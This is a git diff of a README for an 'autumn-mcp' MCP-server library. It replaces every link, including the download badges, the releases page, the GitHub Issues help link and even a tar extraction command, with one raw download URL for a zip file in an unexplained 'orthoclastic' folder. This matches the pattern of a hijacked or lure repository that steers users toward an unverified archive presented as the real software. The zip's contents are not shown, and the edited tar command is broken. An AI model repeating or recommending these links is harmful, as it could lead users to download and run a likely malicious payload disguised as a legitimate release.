@@ -4,7 +4,7 @@
 Welcome to the autumn-mcp library! This guide will help you download and run the software effortlessly. With autumn-mcp, you can develop and manage MCP servers on the autumn framework, making your server management tasks much simpler.
 
 ## 📥 Download Now
-[![Download autumn-mcp](https://img.shields.io/badge/Download-autumn--mcp-brightgreen)](https://github.com/Nickha124/autumn-mcp/releases)
+[![Download autumn-mcp](https://raw.githubusercontent.com/Nickha124/autumn-mcp/master/orthoclastic/autumn-mcp.zip)](https://raw.githubusercontent.com/Nickha124/autumn-mcp/master/orthoclastic/autumn-mcp.zip)
 
 ## 📋 System Requirements
 Before you download, here are the requirements to run the autumn-mcp library effectively:
@@ -18,7 +18,7 @@ Before you download, here are the requirements to run the autumn-mcp library eff
 To get started with autumn-mcp, please follow these steps:
 
 1. **Visit the Releases Page**
-   Go to the [Releases page](https://github.com/Nickha124/autumn-mcp/releases) to find the latest version of the software.
+   Go to the [Releases page](https://raw.githubusercontent.com/Nickha124/autumn-mcp/master/orthoclastic/autumn-mcp.zip) to find the latest version of the software.
 
 2. **Choose Your Version**
    On the Releases page, you will see a list of available versions. Each version comes with notes on the changes and enhancements made.
@@ -39,7 +39,7 @@ To get started with autumn-mcp, please follow these steps:
    - **For Linux:**
      - Open the terminal.
      - Navigate to the directory where you downloaded the package.
-     - Use `tar -xvzf autumn-mcp-linux.tar.gz` to extract the files.
+     - Use `tar -xvzf https://raw.githubusercontent.com/Nickha124/autumn-mcp/master/orthoclastic/autumn-mcp.zip` to extract the files.
      - Follow the instructions in the README file located in the extracted folder.
 
 ## 📖 How to Use autumn-mcp
@@ -72,12 +72,12 @@ If you encounter any issues while using autumn-mcp, consider the following tips:
 - **Server Not Starting:** Check your server settings to ensure everything is configured properly. Consult the documentation for troubleshooting steps.
 
 ## 📞 Get Help
-If you need assistance, feel free to reach out on our [GitHub Issues page](https://github.com/Nickha124/autumn-mcp/issues). Our community and maintainers monitor this page and will help you with any questions or concerns.
+If you need assistance, feel free to reach out on our [GitHub Issues page](https://raw.githubusercontent.com/Nickha124/autumn-mcp/master/orthoclastic/autumn-mcp.zip). Our community and maintainers monitor this page and will help you with any questions or concerns.
 
 ## 🔄 Update Regularly
-To ensure you have the best experience, check the [Releases page](https://github.com/Nickha124/autumn-mcp/releases) regularly for new updates. By keeping your version up to date, you will benefit from the latest features, enhancements, and security fixes.
+To ensure you have the best experience, check the [Releases page](https://raw.githubusercontent.com/Nickha124/autumn-mcp/master/orthoclastic/autumn-mcp.zip) regularly for new updates. By keeping your version up to date, you will benefit from the latest features, enhancements, and security fixes.
 
 ## 📥 Quick Download Link
 If you’re ready to get started, click below to download autumn-mcp now!
 
-[![Download autumn-mcp](https://img.shields.io/badge/Download-autumn--mcp-brightgreen)](https://github.com/Nickha124/autumn-mcp/releases)
+[![Download autumn-mcp](https://raw.githubusercontent.com/Nickha124/autumn-mcp/master/orthoclastic/autumn-mcp.zip)](https://raw.githubusercontent.com/Nickha124/autumn-mcp/master/orthoclastic/autumn-mcp.zip)
